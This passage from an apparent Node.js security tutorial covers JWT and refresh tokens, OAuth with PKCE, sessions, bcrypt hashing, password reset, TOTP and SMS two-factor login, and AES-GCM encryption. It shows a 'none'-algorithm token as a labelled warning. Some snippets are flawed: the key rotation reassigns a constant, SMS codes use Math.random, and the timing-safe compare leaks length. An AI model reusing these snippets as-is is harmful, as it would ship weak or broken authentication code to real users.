const JWT_REFRESH_SECRET = process.env.JWT_REFRESH_SECRET || crypto.randomBytes(64).toString('hex');

// Create access token (short-lived)
function createAccessToken(userId, email) {
  return jwt.sign(
    {
      sub: userId,
      email: email,
      type: 'access'
    },
    JWT_SECRET,
    {
      expiresIn: '15m',  // 15 minutes
      issuer: 'https://example.com',
      audience: 'https://api.example.com'
    }
  );
}

// Create refresh token (long-lived)
function createRefreshToken(userId) {
  return jwt.sign(
    {
      sub: userId,
      type: 'refresh'
    },
    JWT_REFRESH_SECRET,
    {
      expiresIn: '7d',  // 7 days
      issuer: 'https://example.com'
    }
  );
}

// Verify token
function verifyAccessToken(token) {
  try {
    const decoded = jwt.verify(token, JWT_SECRET, {
      issuer: 'https://example.com',
      audience: 'https://api.example.com'
    });
    
    if (decoded.type !== 'access') {
      throw new Error('Invalid token type');
    }
    
    return decoded;
  } catch (error) {
    throw new Error('Invalid token: ' + error.message);
  }
}

function verifyRefreshToken(token) {
  try {
    const decoded = jwt.verify(token, JWT_REFRESH_SECRET, {
      issuer: 'https://example.com'
    });
    
    if (decoded.type !== 'refresh') {
      throw new Error('Invalid token type');
    }
    
    return decoded;
  } catch (error) {
    throw new Error('Invalid refresh token: ' + error.message);
  }
}
```

#### Authentication Flow

```javascript
const express = require('express');
const bcrypt = require('bcrypt');

const app = express();
app.use(express.json());

// Store refresh tokens (use database in production)
const refreshTokens = new Set();

// Login endpoint
app.post('/auth/login', async (req, res) => {
  const { email, password } = req.body;
  
  // Find user (example)
  const user = await db.users.findOne({ email });
  
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Verify password
  const validPassword = await bcrypt.compare(password, user.passwordHash);
  
  if (!validPassword) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Create tokens
  const accessToken = createAccessToken(user.id, user.email);
  const refreshToken = createRefreshToken(user.id);
  
  // Store refresh token
  refreshTokens.add(refreshToken);
  
  // Send tokens
  res.json({
    accessToken,
    refreshToken,
    expiresIn: 900  // 15 minutes in seconds
  });
});

// Refresh token endpoint
app.post('/auth/refresh', async (req, res) => {
  const { refreshToken } = req.body;
  
  if (!refreshToken) {
    return res.status(401).json({ error: 'Refresh token required' });
  }
  
  // Check if token is in store
  if (!refreshTokens.has(refreshToken)) {
    return res.status(403).json({ error: 'Invalid refresh token' });
  }
  
  try {
    // Verify refresh token
    const decoded = verifyRefreshToken(refreshToken);
    
    // Get user
    const user = await db.users.findById(decoded.sub);
    
    if (!user) {
      return res.status(403).json({ error: 'User not found' });
    }
    
    // Create new access token
    const accessToken = createAccessToken(user.id, user.email);
    
    res.json({
      accessToken,
      expiresIn: 900
    });
  } catch (error) {
    return res.status(403).json({ error: 'Invalid refresh token' });
  }
});

// Logout endpoint
app.post('/auth/logout', (req, res) => {
  const { refreshToken } = req.body;
  
  // Remove refresh token
  refreshTokens.delete(refreshToken);
  
  res.json({ success: true });
});

// Protected route middleware
function authenticateToken(req, res, next) {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1]; // Bearer TOKEN
  
  if (!token) {
    return res.status(401).json({ error: 'Access token required' });
  }
  
  try {
    const decoded = verifyAccessToken(token);
    req.user = decoded;
    next();
  } catch (error) {
    return res.status(403).json({ error: 'Invalid or expired token' });
  }
}

// Protected route
app.get('/api/profile', authenticateToken, async (req, res) => {
  const user = await db.users.findById(req.user.sub);
  res.json(user);
});
```

#### JWT Best Practices

```javascript
// 1. Keep tokens short-lived
const accessToken = jwt.sign(payload, secret, { expiresIn: '15m' });

// 2. Use different secrets for access and refresh tokens
const ACCESS_SECRET = process.env.JWT_ACCESS_SECRET;
const REFRESH_SECRET = process.env.JWT_REFRESH_SECRET;

// 3. Store minimal data in JWT
const token = jwt.sign(
  {
    sub: userId,  // Only essential data
    role: userRole
    // Don't store: password, SSN, credit cards, etc.
  },
  secret,
  { expiresIn: '15m' }
);

// 4. Validate all claims
const decoded = jwt.verify(token, secret, {
  algorithms: ['HS256'],  // Specify algorithm
  issuer: 'https://example.com',
  audience: 'https://api.example.com',
  clockTolerance: 10  // Allow 10 seconds clock skew
});

// 5. Implement token rotation
app.post('/auth/refresh', async (req, res) => {
  const { refreshToken } = req.body;
  
  // Verify old token
  const decoded = verifyRefreshToken(refreshToken);
  
  // Create new tokens
  const newAccessToken = createAccessToken(decoded.sub);
  const newRefreshToken = createRefreshToken(decoded.sub);
  
  // Invalidate old refresh token
  refreshTokens.delete(refreshToken);
  refreshTokens.add(newRefreshToken);
  
  res.json({
    accessToken: newAccessToken,
    refreshToken: newRefreshToken
  });
});

// 6. Use secure storage
// Store refresh tokens in httpOnly cookies
res.cookie('refreshToken', refreshToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days
});

// 7. Implement token blacklist for critical actions
const tokenBlacklist = new Set();

app.post('/auth/logout', authenticateToken, (req, res) => {
  // Add token to blacklist
  tokenBlacklist.add(req.headers.authorization.split(' ')[1]);
  res.json({ success: true });
});

// Check blacklist in middleware
function checkBlacklist(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  
  if (tokenBlacklist.has(token)) {
    return res.status(401).json({ error: 'Token has been revoked' });
  }
  
  next();
}
```

#### JWT Security Considerations

```javascript
// DON'T: Use algorithm 'none'
const badToken = jwt.sign(payload, '', { algorithm: 'none' });

// DO: Specify and validate algorithm
const goodToken = jwt.sign(payload, secret, { algorithm: 'HS256' });

jwt.verify(token, secret, { algorithms: ['HS256'] });

// DON'T: Store sensitive data in JWT
const badPayload = {
  userId: 123,
  password: 'secret123',  // Never!
  ssn: '123-45-6789',     // Never!
  creditCard: '4111...'   // Never!
};

// DO: Store only necessary, non-sensitive data
const goodPayload = {
  sub: userId,
  role: 'user',
  permissions: ['read', 'write']
};

// Protect against timing attacks
function secureCompare(a, b) {
  if (a.length !== b.length) {
    return false;
  }
  
  let result = 0;
  for (let i = 0; i < a.length; i++) {
    result |= a.charCodeAt(i) ^ b.charCodeAt(i);
  }
  
  return result === 0;
}
```

### OAuth 2.0 / OpenID Connect

OAuth 2.0 provides delegated authorization; OpenID Connect adds authentication.

#### OAuth 2.0 Authorization Code Flow

```javascript
const crypto = require('crypto');
const axios = require('axios');

// Configuration
const OAUTH_CONFIG = {
  clientId: process.env.OAUTH_CLIENT_ID,
  clientSecret: process.env.OAUTH_CLIENT_SECRET,
  authorizationUrl: 'https://provider.com/oauth/authorize',
  tokenUrl: 'https://provider.com/oauth/token',
  redirectUri: 'https://myapp.com/auth/callback',
  scope: 'openid profile email'
};

// Step 1: Redirect user to authorization URL
app.get('/auth/login', (req, res) => {
  // Generate state for CSRF protection
  const state = crypto.randomBytes(32).toString('hex');
  
  // Store state in session
  req.session.oauthState = state;
  
  // Generate code verifier for PKCE
  const codeVerifier = crypto.randomBytes(32).toString('base64url');
  req.session.codeVerifier = codeVerifier;
  
  // Generate code challenge
  const codeChallenge = crypto
    .createHash('sha256')
    .update(codeVerifier)
    .digest('base64url');
  
  // Build authorization URL
  const params = new URLSearchParams({
    response_type: 'code',
    client_id: OAUTH_CONFIG.clientId,
    redirect_uri: OAUTH_CONFIG.redirectUri,
    scope: OAUTH_CONFIG.scope,
    state: state,
    code_challenge: codeChallenge,
    code_challenge_method: 'S256'
  });
  
  const authUrl = `${OAUTH_CONFIG.authorizationUrl}?${params}`;
  
  res.redirect(authUrl);
});

// Step 2: Handle callback with authorization code
app.get('/auth/callback', async (req, res) => {
  const { code, state } = req.query;
  
  // Verify state (CSRF protection)
  if (state !== req.session.oauthState) {
    return res.status(403).json({ error: 'Invalid state parameter' });
  }
  
  try {
    // Exchange authorization code for tokens
    const response = await axios.post(
      OAUTH_CONFIG.tokenUrl,
      new URLSearchParams({
        grant_type: 'authorization_code',
        code: code,
        redirect_uri: OAUTH_CONFIG.redirectUri,
        client_id: OAUTH_CONFIG.clientId,
        client_secret: OAUTH_CONFIG.clientSecret,
        code_verifier: req.session.codeVerifier
      }),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        }
      }
    );
    
    const { access_token, refresh_token, id_token } = response.data;
    
    // Verify ID token (OpenID Connect)
    const idTokenPayload = verifyIdToken(id_token);
    
    // Create session
    req.session.userId = idTokenPayload.sub;
    req.session.accessToken = access_token;
    req.session.refreshToken = refresh_token;
    
    // Clean up
    delete req.session.oauthState;
    delete req.session.codeVerifier;
    
    res.redirect('/dashboard');
  } catch (error) {
    console.error('Token exchange failed:', error);
    res.status(500).json({ error: 'Authentication failed' });
  }
});

// Verify ID token (simplified - use library in production)
function verifyIdToken(idToken) {
  const decoded = jwt.verify(idToken, process.env.OAUTH_PUBLIC_KEY, {
    algorithms: ['RS256'],
    issuer: 'https://provider.com',
    audience: OAUTH_CONFIG.clientId
  });
  
  return decoded;
}

// Refresh access token
async function refreshAccessToken(refreshToken) {
  try {
    const response = await axios.post(
      OAUTH_CONFIG.tokenUrl,
      new URLSearchParams({
        grant_type: 'refresh_token',
        refresh_token: refreshToken,
        client_id: OAUTH_CONFIG.clientId,
        client_secret: OAUTH_CONFIG.clientSecret
      }),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        }
      }
    );
    
    return response.data;
  } catch (error) {
    throw new Error('Token refresh failed');
  }
}
```

#### Using Passport.js for OAuth

```javascript
const passport = require('passport');
const GoogleStrategy = require('passport-google-oauth20').Strategy;
const GitHubStrategy = require('passport-github2').Strategy;

// Configure Google OAuth
passport.use(new GoogleStrategy({
    clientID: process.env.GOOGLE_CLIENT_ID,
    clientSecret: process.env.GOOGLE_CLIENT_SECRET,
    callbackURL: '/auth/google/callback'
  },
  async (accessToken, refreshToken, profile, done) => {
    try {
      // Find or create user
      let user = await db.users.findOne({ googleId: profile.id });
      
      if (!user) {
        user = await db.users.create({
          googleId: profile.id,
          email: profile.emails[0].value,
          name: profile.displayName,
          avatar: profile.photos[0].value
        });
      }
      
      return done(null, user);
    } catch (error) {
      return done(error);
    }
  }
));

// Configure GitHub OAuth
passport.use(new GitHubStrategy({
    clientID: process.env.GITHUB_CLIENT_ID,
    clientSecret: process.env.GITHUB_CLIENT_SECRET,
    callbackURL: '/auth/github/callback'
  },
  async (accessToken, refreshToken, profile, done) => {
    try {
      let user = await db.users.findOne({ githubId: profile.id });
      
      if (!user) {
        user = await db.users.create({
          githubId: profile.id,
          username: profile.username,
          email: profile.emails?.[0]?.value,
          avatar: profile.photos?.[0]?.value
        });
      }
      
      return done(null, user);
    } catch (error) {
      return done(error);
    }
  }
));

// Serialize user for session
passport.serializeUser((user, done) => {
  done(null, user.id);
});

// Deserialize user from session
passport.deserializeUser(async (id, done) => {
  try {
    const user = await db.users.findById(id);
    done(null, user);
  } catch (error) {
    done(error);
  }
});

// Routes
app.get('/auth/google',
  passport.authenticate('google', { scope: ['profile', 'email'] })
);

app.get('/auth/google/callback',
  passport.authenticate('google', { failureRedirect: '/login' }),
  (req, res) => {
    res.redirect('/dashboard');
  }
);

app.get('/auth/github',
  passport.authenticate('github', { scope: ['user:email'] })
);

app.get('/auth/github/callback',
  passport.authenticate('github', { failureRedirect: '/login' }),
  (req, res) => {
    res.redirect('/dashboard');
  }
);

// Protected route
app.get('/dashboard',
  (req, res, next) => {
    if (!req.isAuthenticated()) {
      return res.redirect('/login');
    }
    next();
  },
  (req, res) => {
    res.render('dashboard', { user: req.user });
  }
);

// Logout
app.get('/logout', (req, res) => {
  req.logout((err) => {
    if (err) return next(err);
    res.redirect('/');
  });
});
```

### Session Management

Server-side session storage for authentication state.

#### Express Session Configuration

```javascript
const session = require('express-session');
const RedisStore = require('connect-redis').default;
const { createClient } = require('redis');

// Create Redis client
const redisClient = createClient({
  host: process.env.REDIS_HOST || 'localhost',
  port: process.env.REDIS_PORT || 6379,
  password: process.env.REDIS_PASSWORD
});

redisClient.connect().catch(console.error);

// Configure session
app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET,
  name: 'sessionId',  // Don't use default 'connect.sid'
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,        // HTTPS only
    httpOnly: true,      // Not accessible via JavaScript
    sameSite: 'strict',  // CSRF protection
    maxAge: 24 * 60 * 60 * 1000,  // 24 hours
    domain: '.example.com'
  },
  rolling: true  // Reset expiration on every response
}));

// Session regeneration on login
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  
  // Verify credentials
  const user = await authenticateUser(email, password);
  
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Regenerate session (prevents session fixation)
  req.session.regenerate((err) => {
    if (err) {
      return res.status(500).json({ error: 'Session error' });
    }
    
    // Store user data in session
    req.session.userId = user.id;
    req.session.role = user.role;
    req.session.loginTime = Date.now();
    
    // Save session
    req.session.save((err) => {
      if (err) {
        return res.status(500).json({ error: 'Session error' });
      }
      
      res.json({ success: true });
    });
  });
});

// Session destruction on logout
app.post('/logout', (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      return res.status(500).json({ error: 'Logout failed' });
    }
    
    res.clearCookie('sessionId');
    res.json({ success: true });
  });
});

// Session validation middleware
function requireAuth(req, res, next) {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  
  // Check session age
  const sessionAge = Date.now() - req.session.loginTime;
  const maxAge = 24 * 60 * 60 * 1000;  // 24 hours
  
  if (sessionAge > maxAge) {
    req.session.destroy();
    return res.status(401).json({ error: 'Session expired' });
  }
  
  next();
}

// Role-based authorization
function requireRole(role) {
  return (req, res, next) => {
    if (!req.session.userId) {
      return res.status(401).json({ error: 'Not authenticated' });
    }
    
    if (req.session.role !== role) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }
    
    next();
  };
}

// Usage
app.get('/api/profile', requireAuth, (req, res) => {
  res.json({ userId: req.session.userId });
});

app.get('/admin/users', requireRole('admin'), (req, res) => {
  res.json({ users: [] });
});
```

#### Session Security Best Practices

```javascript
// 1. Implement session timeout
app.use((req, res, next) => {
  if (req.session.lastActivity) {
    const inactive = Date.now() - req.session.lastActivity;
    const timeout = 30 * 60 * 1000;  // 30 minutes
    
    if (inactive > timeout) {
      req.session.destroy();
      return res.status(401).json({ error: 'Session timeout' });
    }
  }
  
  req.session.lastActivity = Date.now();
  next();
});

// 2. Implement concurrent session detection
const userSessions = new Map();

app.post('/login', async (req, res) => {
  const user = await authenticateUser(req.body.email, req.body.password);
  
  // Check for existing sessions
  const existingSessions = userSessions.get(user.id) || [];
  
  // Limit concurrent sessions
  if (existingSessions.length >= 3) {
    // Invalidate oldest session
    const oldestSession = existingSessions[0];
    req.sessionStore.destroy(oldestSession);
    existingSessions.shift();
  }
  
  // Add new session
  existingSessions.push(req.sessionID);
  userSessions.set(user.id, existingSessions);
  
  req.session.userId = user.id;
  res.json({ success: true });
});

// 3. Detect suspicious activity
app.use((req, res, next) => {
  if (req.session.userId) {
    // Check IP change
    if (req.session.ip && req.session.ip !== req.ip) {
      // Log suspicious activity
      console.warn('IP change detected:', {
        userId: req.session.userId,
        oldIp: req.session.ip,
        newIp: req.ip
      });
      
      // Require re-authentication
      req.session.destroy();
      return res.status(401).json({ error: 'Session invalidated' });
    }
    
    req.session.ip = req.ip;
    
    // Check user agent change
    if (req.session.userAgent && req.session.userAgent !== req.get('user-agent')) {
      req.session.destroy();
      return res.status(401).json({ error: 'Session invalidated' });
    }
    
    req.session.userAgent = req.get('user-agent');
  }
  
  next();
});
```

### Password Hashing (bcrypt)

Never store passwords in plain text; use strong hashing algorithms.

#### Basic Password Hashing

```javascript
const bcrypt = require('bcrypt');

// Hash password
async function hashPassword(password) {
  const saltRounds = 12;  // Higher = more secure but slower
  const hash = await bcrypt.hash(password, saltRounds);
  return hash;
}

// Verify password
async function verifyPassword(password, hash) {
  const match = await bcrypt.compare(password, hash);
  return match;
}

// Registration
app.post('/register', async (req, res) => {
  const { email, password } = req.body;
  
  // Validate password strength
  if (!isStrongPassword(password)) {
    return res.status(400).json({ 
      error: 'Password must be at least 8 characters with uppercase, lowercase, number, and special character' 
    });
  }
  
  try {
    // Hash password
    const passwordHash = await hashPassword(password);
    
    // Create user
    const user = await db.users.create({
      email,
      passwordHash
    });
    
    res.json({ success: true, userId: user.id });
  } catch (error) {
    res.status(500).json({ error: 'Registration failed' });
  }
});

// Login
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  
  try {
    // Find user
    const user = await db.users.findOne({ email });
    
    if (!user) {
      // Don't reveal if user exists
      return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    // Verify password
    const validPassword = await verifyPassword(password, user.passwordHash);
    
    if (!validPassword) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    // Create session/token
    const token = createAccessToken(user.id, user.email);
    
    res.json({ token });
  } catch (error) {
    res.status(500).json({ error: 'Login failed' });
  }
});
```

#### Password Strength Validation

```javascript
function isStrongPassword(password) {
  // At least 8 characters
  if (password.length < 8) return false;
  
  // At least one uppercase letter
  if (!/[A-Z]/.test(password)) return false;
  
  // At least one lowercase letter
  if (!/[a-z]/.test(password)) return false;
  
  // At least one number
  if (!/[0-9]/.test(password)) return false;
  
  // At least one special character
  if (!/[!@#$%^&*(),.?":{}|<>]/.test(password)) return false;
  
  return true;
}

// Check against common passwords
const commonPasswords = new Set([
  'password', '123456', '12345678', 'qwerty', 'abc123',
  'password1', '111111', '123123', 'admin', 'letmein'
]);

function isCommonPassword(password) {
  return commonPasswords.has(password.toLowerCase());
}

// Full validation
function validatePassword(password) {
  const errors = [];
  
  if (password.length < 8) {
    errors.push('Password must be at least 8 characters');
  }
  
  if (password.length > 128) {
    errors.push('Password must be less than 128 characters');
  }
  
  if (!/[A-Z]/.test(password)) {
    errors.push('Password must contain at least one uppercase letter');
  }
  
  if (!/[a-z]/.test(password)) {
    errors.push('Password must contain at least one lowercase letter');
  }
  
  if (!/[0-9]/.test(password)) {
    errors.push('Password must contain at least one number');
  }
  
  if (!/[!@#$%^&*(),.?":{}|<>]/.test(password)) {
    errors.push('Password must contain at least one special character');
  }
  
  if (isCommonPassword(password)) {
    errors.push('Password is too common');
  }
  
  return {
    valid: errors.length === 0,
    errors
  };
}
```

#### Password Reset Flow

```javascript
const crypto = require('crypto');

// Request password reset
app.post('/password/reset-request', async (req, res) => {
  const { email } = req.body;
  
  // Find user
  const user = await db.users.findOne({ email });
  
  // Don't reveal if user exists
  if (!user) {
    return res.json({ success: true });
  }
  
  // Generate reset token
  const resetToken = crypto.randomBytes(32).toString('hex');
  const resetTokenHash = await bcrypt.hash(resetToken, 10);
  
  // Store token with expiration
  await db.users.updateOne(
    { id: user.id },
    {
      resetTokenHash,
      resetTokenExpiry: Date.now() + 3600000  // 1 hour
    }
  );
  
  // Send email with reset link
  const resetUrl = `https://example.com/password/reset?token=${resetToken}&email=${email}`;
  await sendEmail(email, 'Password Reset', `Click here: ${resetUrl}`);
  
  res.json({ success: true });
});

// Reset password
app.post('/password/reset', async (req, res) => {
  const { email, token, newPassword } = req.body;
  
  // Find user
  const user = await db.users.findOne({ email });
  
  if (!user || !user.resetTokenHash) {
    return res.status(400).json({ error: 'Invalid reset token' });
  }
  
  // Check expiration
  if (Date.now() > user.resetTokenExpiry) {
    return res.status(400).json({ error: 'Reset token expired' });
  }
  
  // Verify token
  const validToken = await bcrypt.compare(token, user.resetTokenHash);
  
  if (!validToken) {
    return res.status(400).json({ error: 'Invalid reset token' });
  }
  
  // Validate new password
  const validation = validatePassword(newPassword);
  if (!validation.valid) {
    return res.status(400).json({ errors: validation.errors });
  }
  
  // Hash new password
  const passwordHash = await hashPassword(newPassword);
  
  // Update password and clear reset token
  await db.users.updateOne(
    { id: user.id },
    {
      passwordHash,
      resetTokenHash: null,
      resetTokenExpiry: null,
      passwordChangedAt: Date.now()
    }
  );
  
  // Invalidate all existing sessions
  await invalidateUserSessions(user.id);
  
  res.json({ success: true });
});
```

### Multi-factor Authentication

Add an extra layer of security beyond passwords.

#### TOTP (Time-based One-Time Password)

```javascript
const speakeasy = require('speakeasy');
const QRCode = require('qrcode');

// Enable 2FA - Generate secret
app.post('/auth/2fa/enable', authenticateToken, async (req, res) => {
  const userId = req.user.sub;
  
  // Generate secret
  const secret = speakeasy.generateSecret({
    name: `MyApp (${req.user.email})`,
    issuer: 'MyApp'
  });
  
  // Store secret temporarily (don't enable yet)
  await db.users.updateOne(
    { id: userId },
    { tempTotpSecret: secret.base32 }
  );
  
  // Generate QR code
  const qrCodeUrl = await QRCode.toDataURL(secret.otpauth_url);
  
  res.json({
    secret: secret.base32,
    qrCode: qrCodeUrl
  });
});

// Verify and activate 2FA
app.post('/auth/2fa/verify', authenticateToken, async (req, res) => {
  const { token } = req.body;
  const userId = req.user.sub;
  
  // Get temp secret
  const user = await db.users.findById(userId);
  
  if (!user.tempTotpSecret) {
    return res.status(400).json({ error: '2FA setup not initiated' });
  }
  
  // Verify token
  const verified = speakeasy.totp.verify({
    secret: user.tempTotpSecret,
    encoding: 'base32',
    token: token,
    window: 2  // Allow 2 time steps before/after
  });
  
  if (!verified) {
    return res.status(400).json({ error: 'Invalid token' });
  }
  
  // Generate backup codes
  const backupCodes = Array.from({ length: 10 }, () =>
    crypto.randomBytes(4).toString('hex')
  );
  
  const backupCodesHash = await Promise.all(
    backupCodes.map(code => bcrypt.hash(code, 10))
  );
  
  // Enable 2FA
  await db.users.updateOne(
    { id: userId },
    {
      totpSecret: user.tempTotpSecret,
      tempTotpSecret: null,
      twoFactorEnabled: true,
      backupCodes: backupCodesHash
    }
  );
  
  res.json({
    success: true,
    backupCodes  // Show once, user must save
  });
});

// Login with 2FA
app.post('/auth/login', async (req, res) => {
  const { email, password, totpToken } = req.body;
  
  // Verify credentials
  const user = await db.users.findOne({ email });
  
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  const validPassword = await bcrypt.compare(password, user.passwordHash);
  
  if (!validPassword) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Check if 2FA enabled
  if (user.twoFactorEnabled) {
    if (!totpToken) {
      return res.status(200).json({ 
        requires2FA: true,
        tempToken: createTempToken(user.id)  // Short-lived token for 2FA step
      });
    }
    
    // Verify TOTP
    const verified = speakeasy.totp.verify({
      secret: user.totpSecret,
      encoding: 'base32',
      token: totpToken,
      window: 2
    });
    
    if (!verified) {
      return res.status(401).json({ error: 'Invalid 2FA token' });
    }
  }
  
  // Create session
  const token = createAccessToken(user.id, user.email);
  res.json({ token });
});

// Disable 2FA
app.post('/auth/2fa/disable', authenticateToken, async (req, res) => {
  const { password, totpToken } = req.body;
  const userId = req.user.sub;
  
  // Verify password
  const user = await db.users.findById(userId);
  const validPassword = await bcrypt.compare(password, user.passwordHash);
  
  if (!validPassword) {
    return res.status(401).json({ error: 'Invalid password' });
  }
  
  // Verify TOTP
  const verified = speakeasy.totp.verify({
    secret: user.totpSecret,
    encoding: 'base32',
    token: totpToken,
    window: 2
  });
  
  if (!verified) {
    return res.status(401).json({ error: 'Invalid 2FA token' });
  }
  
  // Disable 2FA
  await db.users.updateOne(
    { id: userId },
    {
      totpSecret: null,
      twoFactorEnabled: false,
      backupCodes: null
    }
  );
  
  res.json({ success: true });
});
```

#### SMS-based 2FA

```javascript
const twilio = require('twilio');

const twilioClient = twilio(
  process.env.TWILIO_ACCOUNT_SID,
  process.env.TWILIO_AUTH_TOKEN
);

// Store verification codes temporarily
const verificationCodes = new Map();

// Send SMS code
app.post('/auth/2fa/sms/send', authenticateToken, async (req, res) => {
  const userId = req.user.sub;
  const user = await db.users.findById(userId);
  
  if (!user.phoneNumber) {
    return res.status(400).json({ error: 'Phone number not configured' });
  }
  
  // Generate 6-digit code
  const code = Math.floor(100000 + Math.random() * 900000).toString();
  
  // Store code with expiration
  verificationCodes.set(userId, {
    code: await bcrypt.hash(code, 10),
    expiry: Date.now() + 300000,  // 5 minutes
    attempts: 0
  });
  
  // Send SMS
  try {
    await twilioClient.messages.create({
      body: `Your verification code is: ${code}`,
      from: process.env.TWILIO_PHONE_NUMBER,
      to: user.phoneNumber
    });
    
    res.json({ success: true });
  } catch (error) {
    console.error('SMS send failed:', error);
    res.status(500).json({ error: 'Failed to send SMS' });
  }
});

// Verify SMS code
app.post('/auth/2fa/sms/verify', authenticateToken, async (req, res) => {
  const { code } = req.body;
  const userId = req.user.sub;
  
  const storedData = verificationCodes.get(userId);
  
  if (!storedData) {
    return res.status(400).json({ error: 'No verification code sent' });
  }
  
  // Check expiration
  if (Date.now() > storedData.expiry) {
    verificationCodes.delete(userId);
    return res.status(400).json({ error: 'Code expired' });
  }
  
  // Check attempts (prevent brute force)
  if (storedData.attempts >= 3) {
    verificationCodes.delete(userId);
    return res.status(429).json({ error: 'Too many attempts' });
  }
  
  // Verify code
  const valid = await bcrypt.compare(code, storedData.code);
  
  if (!valid) {
    storedData.attempts++;
    return res.status(400).json({ error: 'Invalid code' });
  }
  
  // Success
  verificationCodes.delete(userId);
  res.json({ success: true });
});
```

---

## 24.4 Data Protection

Protecting user data is both a security and legal requirement.

### Encryption in Transit and at Rest

Encrypt data during transmission and storage.

#### Encryption in Transit (TLS/HTTPS)

```javascript
const https = require('https');
const fs = require('fs');
const express = require('express');

const app = express();

// Read SSL/TLS certificates
const options = {
  key: fs.readFileSync('/path/to/private-key.pem'),
  cert: fs.readFileSync('/path/to/certificate.pem'),
  ca: fs.readFileSync('/path/to/ca-certificate.pem'),  // If using CA
  
  // Security options
  ciphers: [
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES256-GCM-SHA384'
  ].join(':'),
  honorCipherOrder: true,
  minVersion: 'TLSv1.2',
  maxVersion: 'TLSv1.3'
};

// Create HTTPS server
https.createServer(options, app).listen(443, () => {
  console.log('HTTPS server running on port 443');
});

// Redirect HTTP to HTTPS
const http = require('http');

http.createServer((req, res) => {
  res.writeHead(301, { 
    'Location': `https://${req.headers.host}${req.url}` 
  });
  res.end();
}).listen(80);

// Security headers
app.use((req, res, next) => {
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');
  next();
});
```

#### Encryption at Rest

```javascript
const crypto = require('crypto');

// Encryption configuration
const ENCRYPTION_KEY = Buffer.from(process.env.ENCRYPTION_KEY, 'hex'); // 32 bytes
const ALGORITHM = 'aes-256-gcm';

// Encrypt data
function encrypt(text) {
  // Generate random IV
  const iv = crypto.randomBytes(16);
  
  // Create cipher
  const cipher = crypto.createCipheriv(ALGORITHM, ENCRYPTION_KEY, iv);
  
  // Encrypt
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  
  // Get auth tag
  const authTag = cipher.getAuthTag();
  
  // Return IV + authTag + encrypted data
  return {
    iv: iv.toString('hex'),
    authTag: authTag.toString('hex'),
    encrypted: encrypted
  };
}

// Decrypt data
function decrypt(encryptedData) {
  const { iv, authTag, encrypted } = encryptedData;
  
  // Create decipher
  const decipher = crypto.createDecipheriv(
    ALGORITHM,
    ENCRYPTION_KEY,
    Buffer.from(iv, 'hex')
  );
  
  // Set auth tag
  decipher.setAuthTag(Buffer.from(authTag, 'hex'));
  
  // Decrypt
  let decrypted = decipher.update(encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  
  return decrypted;
}

// Usage with database
class SecureUserModel {
  async createUser(data) {
    // Encrypt sensitive fields
    const encryptedSSN = encrypt(data.ssn);
    const encryptedCreditCard = encrypt(data.creditCard);
    
    return await db.users.create({
      name: data.name,
      email: data.email,
      ssn: JSON.stringify(encryptedSSN),
      creditCard: JSON.stringify(encryptedCreditCard)
    });
  }
  
  async getUser(id) {
    const user = await db.users.findById(id);
    
    // Decrypt sensitive fields
    return {
      ...user,
      ssn: decrypt(JSON.parse(user.ssn)),
      creditCard: decrypt(JSON.parse(user.creditCard))
    };
  }
}

// Key rotation
async function rotateEncryptionKey() {
  const newKey = crypto.randomBytes(32);
  
  // Re-encrypt all sensitive data with new key
  const users = await db.users.find({});
  
  for (const user of users) {
    // Decrypt with old key
    const oldData = decrypt(JSON.parse(user.ssn));
    
    // Switch to new key
    const oldKey = ENCRYPTION_KEY;
    ENCRYPTION_KEY = newKey;
    
    // Encrypt with new key
    const newData = encrypt(oldData);
    
    // Update database
    await db.users.updateOne(
      { id: user.id },
      { ssn: JSON.stringify(newData) }
    );
  }
  
  // Store new key securely
  process.env.ENCRYPTION_KEY = newKey.toString('hex');
}
```

#### Field-level Encryption

```javascript
class EncryptedField {
  constructor(key) {
    this.key = Buffer.from(key, 'hex');
  }
  
  encrypt(value) {
    if (!value) return null;
    
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-gcm', this.key, iv);
    
    let encrypted = cipher.update(String(value), 'utf8', 'base64');
    encrypted += cipher.final('base64');
    
    const authTag = cipher.getAuthTag().toString('base64');
    
    return `${iv.toString('base64')}:${authTag}:${encrypted}`;
  }
  
  decrypt(value) {
    if (!value) return null;
    
    const [ivB64, authTagB64, encrypted] = value.split(':');
    
    const iv = Buffer.from(ivB64, 'base64');
    const authTag = Buffer.from(authTagB64, 'base64');
    
    const decipher = crypto.createDecipheriv('aes-256-gcm', this.key, iv);
    decipher.setAuthTag(authTag);
    
    let decrypted = decipher.update(encrypted, 'base64', 'utf8');
    decrypted += decipher.final('utf8');
    
    return decrypted;
  }
}

// Mongoose plugin for field encryption
function encryptionPlugin(schema, options) {
  const encryptedFields = new Map();
  
  // Identify encrypted fields
  for (const [path, schemaType] of Object.entries(schema.paths)) {
    if (schemaType.options.encrypt) {
      const encryptor = new EncryptedField(process.env.ENCRYPTION_KEY);
